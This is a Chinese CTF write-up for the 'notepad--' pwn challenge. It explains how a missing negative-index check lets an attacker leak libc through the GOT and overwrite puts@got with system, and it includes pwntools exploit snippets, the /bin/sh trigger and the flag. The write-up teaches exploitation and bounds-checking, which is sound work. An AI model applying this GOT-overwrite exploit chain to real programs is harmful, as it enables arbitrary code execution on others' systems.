# notepad--

## 题目简述

WelcomeCTF2021 的 notepad-- 在全局数组中保存 10 个笔记。索引检查只拒绝 `idx >= 10`，没有拒绝负数，因此读写操作可以访问 `notes` 之前的 GOT 区域。目标是利用负索引泄漏 libc，并把一次输出调用改造成 `system("/bin/sh")`。

## 解题过程

漏洞函数为：

```c
if (idx >= NOTES_SZ) {
    exit(-1);
}
return &notes[idx];
```

`Note` 大小为 `0x30`，负索引会按该步长向全局数组之前移动。官方脚本先查看 `-4` 号笔记，此位置的 `name` 对应 `printf` 的 GOT 内容。`view_note` 使用 `puts(note->name)` 输出，因此能够取得真实 `printf` 地址：

```python
view_note(-4)
io.recvuntil("Name: ")
printf_runtime = u64(io.recvline(False).ljust(8, b"\0"))
libc.address = printf_runtime - libc.symbols["printf"]
```

随后用 `create_note(-5, ...)` 覆盖相邻 GOT 表项，把 `puts@got` 改为 `system`。官方 payload 根据 `Note` 的 `name[0x10]` 和 `content[0x20]` 布局，把 `system` 放入对应的 8 字节槽位：

```python
create_note(
    -5,
    p64(0) * 2,
    p64(0) + p64(0) + p64(libc.symbols["system"]) + p64(0),
)
```

最后创建 0 号笔记，使 `name` 为 `/bin/sh`，再查看它。原本的 `puts(note->name)` 已变为 `system(note->name)`，从而获得 shell：

```text
greyhats{y_s0_-v3_56w81}
```

## 方法总结

数组边界检查必须同时验证下界和上界。这里同一个负索引原语既能把 GOT 当作字符串泄漏，又能把 GOT 当作笔记内容覆盖，形成完整的“泄漏 libc—改写函数指针—传入可控参数”利用链。
